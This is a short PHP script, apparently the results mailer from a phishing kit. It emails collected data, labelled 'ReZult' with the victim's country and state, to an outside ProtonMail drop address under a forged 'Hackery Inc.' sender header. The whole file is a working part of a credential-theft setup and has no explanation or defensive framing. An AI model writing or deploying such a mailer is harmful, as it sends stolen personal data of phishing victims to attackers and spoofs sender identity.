<?php

$to = "chopdodo@protonmail.com";
$subject = "ILLINOIS ReZult $country | $state";
$from = "From: Hackery Inc.<roberta.allwright@inbox.lv>";

mail($to,$subject,$msg,$from);

?>